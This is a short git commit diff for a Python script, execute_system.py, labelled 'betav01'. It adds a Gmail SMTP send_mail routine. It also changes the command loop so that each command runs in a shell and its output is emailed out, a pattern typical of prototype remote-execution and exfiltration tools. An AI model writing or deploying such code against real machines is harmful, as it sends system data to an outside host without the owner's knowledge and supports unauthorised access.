9647bb80058e3cbc863f8f455f22ea0771c47e68
root <root@localhost.localdomain>
2019-06-15 18:23:18 -0400

    betav01

--- Scripts/execute_system.py
+++ Scripts/execute_system.py
@@ -1,10 +1,28 @@
 import subprocess
+import smtplib
 import os
+import optparse
+from optparse import OptionParser
+
+def send_mail(email, password, message):
+    server = smtplib.SMTP("smtp.gmail.com", 587)
+    server.starttls()
+    server.login(email,password)
+    server.sendmail(email, email, message)
+    server.quit()
+
+parser = OptionParser()
+parser.add_option("-m", "--mail", dest="email", help="Your email")
+parser.add_option("-p", "--pass", dest="password", help="Your pass")
+(option, args) = parser.parse_args()
+email = option.email
+password = option.password
 while True:
     try:
         print("{0}~$: ".format(os.getcwd()))
         command = raw_input()
-        subprocess.Popen(command, shell=True)
+        result=subprocess.check_output(command, shell=True)
+        send_mail(email,password, result)
     except KeyboardInterrupt:
         break
         print("Program complete.")
